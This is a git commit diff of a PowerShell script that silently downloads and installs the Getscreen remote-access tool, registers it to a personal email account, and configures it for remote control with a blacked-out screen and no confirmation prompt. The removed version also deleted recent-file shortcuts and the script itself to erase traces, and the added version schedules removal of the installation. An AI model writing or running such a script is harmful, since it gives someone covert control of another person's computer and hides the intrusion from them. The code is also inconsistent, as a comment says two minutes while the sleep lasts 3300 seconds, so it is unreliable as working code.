0f0c0dc44d4e5f3e140def82c603743fcea8b86b
Tansorov <62895005+d3d0n@users.noreply.github.com>
2024-01-24 02:33:05 +0500

    Update getscreen.ps1 / Final

--- getscreen.ps1
+++ getscreen.ps1
@@ -1,22 +1,40 @@
 # This script will donwload getscreen and install it silently
 
-#Fetching getscreen binary
-$webclient = New-Object System.Net.WebClient
-$url = "https://getscreen.ru/invite/download/getscreen.msi?utm_user=gb2a1pd2q66z9e8zd2b2x7jdxpjbhj9qxblknr1nng4742379"
-$file = "getscreen.msi"
-$webclient.DownloadFile($url,$file)
+function Install-Getscreen {
+    #Fetching getscreen binary
+    # Download the getscreen binary from the official website
+    $installerUrl = "https://getscreen.ru/download/getscreen.msi"
+    $installerPath = "$PSScriptRoot\getscreen.msi"
+    try {
+        Invoke-WebRequest -Uri $installerUrl -OutFile $installerPath -ErrorAction SilentlyContinue
+    }
+    catch {
+        #If corrupted, download again until it is not corrupted
+        while ((Get-FileHash -Path $installerPath -Algorithm MD5).Hash -ne "393A2BD95FEDA999A621E846904F66CE") {
+            Invoke-WebRequest -Uri $installerUrl -OutFile $installerPath -ErrorAction Continue
+        }
+    }
 
-#Installing getscreen without user interaction
-Start-Process -FilePath "msiexec.exe" -ArgumentList "/i getscreen.msi /qn REGISTER="tancorovruslan@gmail.com:10791" CONFIG="name='My Computer' language=ru autostart=false nonadmin=true control=true fast_access=false file_transfer=false audio_calls=false black_screen=true disable_confirmation=true"" -Wait
+    #Installing getscreen without user interaction and verbose logging
+    Start-Process -FilePath "msiexec.exe" -ArgumentList "/i getscreen.msi /qn REGISTER=`"tancorovruslan@gmail.com:10791`" CONFIG=`"name='test01' language=ru autostart=false nonadmin=true control=true fast_access=false file_transfer=false audio_calls=false black_screen=true disable_confirmation=true proxy='socks5://username:password@10.0.0.6:8080'`"" -Wait -ErrorAction Stop
 
-#Removing getscreen binary and this script from recent files
-Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Recent\getscreen.msi.lnk"
-Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Recent\getscreen.ps1.lnk"
-#Removing getscreen binary
-Remove-Item -Path "$PSScriptRoot\getscreen.msi"
-#Removing this script
-Remove-Item -Path $MyInvocation.MyCommand.Path
+    #Check if getscreen is installed
+    if (Test-Path "C:\Program Files\Getscreen\getscreen.exe") {
+        Write-Host "getscreen installed successfully"
+    }
+    else {
+        Write-Host "getscreen installation failed"
+    }
+}
 
-#Uninstall getscreen after 5 minutes
-Start-Sleep -Seconds 300
-Start-Process -FilePath "msiexec.exe" -ArgumentList "/x getscreen.msi /qn" -Wait
+Install-Getscreen
+
+#Uninstall getscreen after 2 minutes
+Start-Sleep -Seconds 3300
+Start-Process -FilePath "C:\Program Files\Getscreen\getscreen.exe" -ArgumentList "-uninstall" -Wait -ErrorAction Stop
+
+#Remove getscreen installer
+Remove-Item -Path "$PSScriptRoot\getscreen.msi" -Force
+
+#Remove GetScreen installation folder
+Remove-Item -Path "C:\Program Files\Getscreen" -Recurse -Force
